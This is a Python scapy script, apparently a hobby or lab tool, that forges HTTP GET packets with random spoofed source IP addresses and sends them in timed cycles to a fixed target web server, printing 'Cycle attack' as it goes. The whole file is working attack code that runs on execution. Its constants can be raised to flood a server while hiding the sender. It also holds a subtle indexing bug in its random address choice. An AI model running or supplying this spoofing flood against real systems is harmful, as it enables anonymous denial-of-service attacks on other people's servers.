import time
from random import randint
from scapy.sendrecv import send

from headers import Header

DEFAULT_HTTP_VERSION = 2.0
DEFAULT_NUMBER_PACKETS_PER_CYCLES = 1
DEFAULT_NUMBER_CYCLES = 10
DEFAULT_TIME_BETWEEN_CYCLES = 10
DEFAULT_SOURCE_ADDRESS = '10.10.10.10'
DEFAULT_RANDOM_ADDRESS_SOURCE = True
DEFAULT_DESTINATION_ADDRESS = '10.10.10.11'
DEFAULT_TIME_LIFE_PACKET = 10
DEFAULT_SOURCE_PORT = 80
DEFAULT_DESTINATION_PORT = 80
DEFAULT_NUMBER_RANDOM_ADDRESS = 100


def get_random_address_list(number_address=DEFAULT_NUMBER_RANDOM_ADDRESS):
    list_address = [[randint(0, 255), randint(0, 255), randint(0, 255), randint(0, 255)] for i in range(number_address)]
    list_address = ['.'.join(list(map(str, i))) for i in list_address]
    return list_address


def create_spoofing_packet(requisition, version=DEFAULT_HTTP_VERSION):

    spoofing_packet = "GET /{} HTTP/{} \n\n".format(str(requisition), version)
    spoofing_packet = bytes(spoofing_packet, "utf-8")
    return spoofing_packet


def attack_function():

    headers = Header(time_life_packet=DEFAULT_TIME_LIFE_PACKET, source_address=DEFAULT_SOURCE_ADDRESS,
                     destination_address=DEFAULT_DESTINATION_ADDRESS, source_port=DEFAULT_SOURCE_PORT,
                     destination_port=DEFAULT_DESTINATION_PORT, internal=1)
    list_address = []
    if DEFAULT_RANDOM_ADDRESS_SOURCE:
        list_address = get_random_address_list(DEFAULT_NUMBER_RANDOM_ADDRESS)


    for i in range(DEFAULT_NUMBER_CYCLES):

        new_requisition = create_spoofing_packet('index.html', version=DEFAULT_HTTP_VERSION)

        if DEFAULT_RANDOM_ADDRESS_SOURCE:

            headers.set_source_address(list_address[randint(0, DEFAULT_NUMBER_RANDOM_ADDRESS)])

        packet_spoofing = headers.create_header_network_layer()
        packet_spoofing = headers.create_header_transport_layer(packet_spoofing)
        packet_spoofing = headers.create_header_application_layer(packet_spoofing, new_requisition)
        packet_spoofing = packet_spoofing * DEFAULT_NUMBER_PACKETS_PER_CYCLES
        send(packet_spoofing)
        time.sleep(DEFAULT_TIME_BETWEEN_CYCLES)
        print("Cycle attack {} - Address {}".format(i, DEFAULT_DESTINATION_ADDRESS))

attack_function()